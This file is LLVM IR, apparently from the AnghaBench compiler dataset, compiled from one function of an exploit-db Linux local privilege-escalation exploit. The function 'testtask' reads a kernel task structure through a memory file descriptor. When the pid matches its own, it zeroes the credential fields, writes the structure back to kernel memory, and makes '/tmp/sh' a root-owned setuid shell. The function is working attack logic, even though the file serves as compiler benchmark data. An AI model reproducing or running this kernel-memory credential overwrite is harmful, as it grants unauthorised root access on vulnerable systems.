; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19254.c_testtask.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19254.c_testtask.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.task_struct = type { i64, i64, i64 }

@mem_fd = common dso_local global i32 0, align 4
@SEEK_SET = common dso_local global i32 0, align 4
@SIZEOF = common dso_local global i32 0, align 4
@mypid = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [8 x i8] c"/tmp/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @testtask(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.task_struct, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %6 = load i32, i32* @mem_fd, align 4
  %7 = load i32, i32* %2, align 4
  %8 = load i32, i32* @SEEK_SET, align 4
  %9 = call i32 @lseek(i32 %6, i32 %7, i32 %8)
  %10 = load i32, i32* @mem_fd, align 4
  %11 = load i32, i32* @SIZEOF, align 4
  %12 = call i32 @read(i32 %10, %struct.task_struct* %3, i32 %11)
  %13 = getelementptr inbounds %struct.task_struct, %struct.task_struct* %3, i32 0, i32 0
  %14 = load i64, i64* %13, align 8
  %15 = load i64, i64* @mypid, align 8
  %16 = icmp eq i64 %14, %15
  br i1 %16, label %17, label %30

17:                                               ; preds = %1
  %18 = getelementptr inbounds %struct.task_struct, %struct.task_struct* %3, i32 0, i32 2
  store i64 0, i64* %18, align 8
  %19 = getelementptr inbounds %struct.task_struct, %struct.task_struct* %3, i32 0, i32 1
  store i64 0, i64* %19, align 8
  %20 = load i32, i32* @mem_fd, align 4
  %21 = load i32, i32* %2, align 4
  %22 = load i32, i32* @SEEK_SET, align 4
  %23 = call i32 @lseek(i32 %20, i32 %21, i32 %22)
  %24 = load i32, i32* @mem_fd, align 4
  %25 = load i32, i32* @SIZEOF, align 4
  %26 = call i32 @write(i32 %24, %struct.task_struct* %3, i32 %25)
  %27 = call i32 @chown(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i32 0, i32 0)
  %28 = call i32 @chmod(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i32 2541)
  %29 = call i32 @exit(i32 0) #3
  unreachable

30:                                               ; preds = %1
  ret void
}

declare dso_local i32 @lseek(i32, i32, i32) #1

declare dso_local i32 @read(i32, %struct.task_struct*, i32) #1

declare dso_local i32 @write(i32, %struct.task_struct*, i32) #1

declare dso_local i32 @chown(i8*, i32, i32) #1

declare dso_local i32 @chmod(i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
